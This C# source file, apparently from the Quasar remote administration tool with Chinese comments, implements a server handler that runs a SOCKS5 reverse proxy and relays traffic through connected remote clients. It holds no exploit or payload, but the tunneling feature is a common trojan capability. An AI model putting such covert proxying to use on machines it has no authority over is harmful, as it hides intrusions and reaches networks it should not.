﻿using Quasar.Common.Messages;
using Quasar.Common.Messages.ReverseProxy;
using Quasar.Common.Networking;
using Quasar.Server.Networking;
using Quasar.Server.ReverseProxy;
using System;
using System.Linq;

namespace Quasar.Server.Messages
{
    /// <summary>
    /// 处理与远程反向代理交互的消息。
    /// </summary>
    public class ReverseProxyHandler : MessageProcessorBase<ReverseProxyClient[]>
    {
        /// <summary>
        /// 与此反向代理处理器关联的客户端。
        /// </summary>
        private readonly Client[] _clients;

        /// <summary>
        /// 用于接受和提供SOCKS5连接的反向代理服务器。
        /// </summary>
        private readonly ReverseProxyServer _socksServer;

        /// <summary>
        /// 使用给定客户端初始化 <see cref="ReverseProxyHandler"/> 类的新实例。
        /// </summary>
        /// <param name="clients">关联的客户端。</param>
        public ReverseProxyHandler(Client[] clients) : base(true)
        {
            _socksServer = new ReverseProxyServer();
            _clients = clients;
        }

        /// <inheritdoc />
        public override bool CanExecute(IMessage message) => message is ReverseProxyConnectResponse ||
                                                             message is ReverseProxyData ||
                                                             message is ReverseProxyDisconnect;

        /// <inheritdoc />
        public override bool CanExecuteFrom(ISender sender) => _clients.Any(c => c.Equals(sender));

        /// <inheritdoc />
        public override void Execute(ISender sender, IMessage message)
        {
            switch (message)
            {
                case ReverseProxyConnectResponse con:
                    Execute(sender, con);
                    break;
                case ReverseProxyData data:
                    Execute(sender, data);
                    break;
                case ReverseProxyDisconnect disc:
                    Execute(sender, disc);
                    break;
            }
        }

        /// <summary>
        /// 使用给定端口启动反向代理服务器。
        /// </summary>
        /// <param name="port">要监听的端口。</param>
        public void StartReverseProxyServer(ushort port)
        {
            _socksServer.OnConnectionEstablished += socksServer_onConnectionEstablished;
            _socksServer.OnUpdateConnection += socksServer_onUpdateConnection;
            _socksServer.StartServer(_clients, "0.0.0.0", port);
        }

        /// <summary>
        /// 停止反向代理服务器。
        /// </summary>
        public void StopReverseProxyServer()
        {
            _socksServer.Stop();
            _socksServer.OnConnectionEstablished -= socksServer_onConnectionEstablished;
            _socksServer.OnUpdateConnection -= socksServer_onUpdateConnection;
        }

        private void Execute(ISender client, ReverseProxyConnectResponse message)
        {
            ReverseProxyClient socksClient = _socksServer.GetClientByConnectionId(message.ConnectionId);
            socksClient?.HandleCommandResponse(message);
        }

        private void Execute(ISender client, ReverseProxyData message)
        {
            ReverseProxyClient socksClient = _socksServer.GetClientByConnectionId(message.ConnectionId);
            socksClient?.SendToClient(message.Data);
        }

        private void Execute(ISender client, ReverseProxyDisconnect message)
        {
            ReverseProxyClient socksClient = _socksServer.GetClientByConnectionId(message.ConnectionId);
            socksClient?.Disconnect();
        }

        void socksServer_onUpdateConnection(ReverseProxyClient proxyClient)
        {
            OnReport(_socksServer.OpenConnections);
        }

        void socksServer_onConnectionEstablished(ReverseProxyClient proxyClient)
        {
            OnReport(_socksServer.OpenConnections);
        }

        /// <summary>
        /// 释放与此消息处理器关联的所有托管和非托管资源。
        /// </summary>
        public void Dispose()
        {
            Dispose(true);
            GC.SuppressFinalize(this);
        }

        protected virtual void Dispose(bool disposing)
        {
            if (disposing)
            {
                StopReverseProxyServer();
            }
        }
    }
}
